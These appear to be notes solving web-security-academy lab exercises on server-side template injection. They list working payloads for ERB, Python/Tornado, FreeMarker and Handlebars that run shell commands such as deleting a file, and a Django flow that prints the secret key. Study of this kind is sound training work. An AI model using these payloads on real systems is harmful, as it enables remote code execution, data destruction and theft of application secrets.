
### Basic server-side template injection
**Payload** :
```
https://0a8a00ae03020ba98091d008000a0039.web-security-academy.net/?message=%3C%=`rm%20morale.txt`%%3E
```

### Basic server-side template injection (code context)
**Payload** :
```http
blog-post-author-display=user.name}}{%import+os%}{{os.system('rm+morale.txt')}}
&csrf=akANx16XToCIySwg5sRCZOHI6tXRJjYp
```

### Server-side template injection using documentation
**Payload** :
```http
${"freemarker.template.utility.Execute"?new()("rm morale.txt")}
```
Login as Content-Manager -> Edit page, and put the payload on template engine

### Server-side template injection in an unknown language with a documented exploit
**Flow** :
Insert template ssti -> looks techstack used 'handlebars' -> search on google ->PayloadAllTheThings -> url encoded the payload

**Payload** : 
```js
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Server-side template injection with information disclosure via user-supplied objects
**Flow** :
trigger error -> found out using django -> {% debug %} -> there's settings object -> read django docs -> print {{ settings.SECRET_KEY }}